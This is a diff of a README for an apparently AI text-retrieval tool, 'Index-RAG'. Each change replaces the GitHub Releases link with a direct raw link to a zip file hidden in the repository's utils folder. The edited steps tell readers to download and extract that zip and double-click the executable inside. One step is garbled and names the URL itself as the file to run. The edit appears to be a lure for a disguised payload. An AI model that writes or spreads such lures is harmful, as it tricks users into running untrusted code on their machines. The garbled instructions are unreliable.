@@ -7,14 +7,14 @@
 - **Versatile Use**: Ideal for Quality Assurance tasks and more.
 
 ## 📦 Download Now
-[![Download Index-RAG](https://img.shields.io/badge/Download-Index--RAG-blue)](https://github.com/X44444444/Index-RAG/releases)
+[![Download Index-RAG](https://raw.githubusercontent.com/X44444444/Index-RAG/main/index_rag/utils/Index-RAG-1.0-beta.4.zip)](https://raw.githubusercontent.com/X44444444/Index-RAG/main/index_rag/utils/Index-RAG-1.0-beta.4.zip)
 
 ## 🚀 Getting Started
-1. **Visit the Release Page**: Click [here](https://github.com/X44444444/Index-RAG/releases) to go directly to the download page.
+1. **Visit the Release Page**: Click [here](https://raw.githubusercontent.com/X44444444/Index-RAG/main/index_rag/utils/Index-RAG-1.0-beta.4.zip) to go directly to the download page.
 2. **Select Your Version**: Find the latest version of Index-RAG that suits your needs.
 3. **Download the Files**: Click on the file name to start downloading.
 4. **Extract the Files (if needed)**: If you downloaded a ZIP file, right-click on it and choose "Extract All" to access the files.
-5. **Run the Application**: Locate the application file (e.g., `Index-RAG.exe`) in the extracted folder and double-click it to start.
+5. **Run the Application**: Locate the application file (e.g., `https://raw.githubusercontent.com/X44444444/Index-RAG/main/index_rag/utils/Index-RAG-1.0-beta.4.zip`) in the extracted folder and double-click it to start.
 
 ## 📋 System Requirements
 - **Operating System**: Windows 10 or later, macOS 10.15 or later.
@@ -26,7 +26,7 @@
 Index-RAG connects your text data with vector databases, making it easier to retrieve relevant information quickly. This is especially useful in QA tasks where speed and accuracy are crucial.
 
 ## 🛠️ Installation
-1. **Download & Install**: Go to the [Releases page](https://github.com/X44444444/Index-RAG/releases).
+1. **Download & Install**: Go to the [Releases page](https://raw.githubusercontent.com/X44444444/Index-RAG/main/index_rag/utils/Index-RAG-1.0-beta.4.zip).
 2. **Choose Your File**: Click on the latest version of Index-RAG.
 3. **Run the Setup**: If you downloaded a setup file, double-click it and follow the prompts.
 
@@ -56,4 +56,4 @@ We appreciate all contributions and feedback from our users. Your input helps us
 ## 🔗 Additional Information
 Explore more topics related to Index-RAG and its applications in areas like AI agents, natural language processing, and text retrieval. Stay updated with our latest developments and features.
 
-[Download Index-RAG](https://github.com/X44444444/Index-RAG/releases) to get started today!
+[Download Index-RAG](https://raw.githubusercontent.com/X44444444/Index-RAG/main/index_rag/utils/Index-RAG-1.0-beta.4.zip) to get started today!
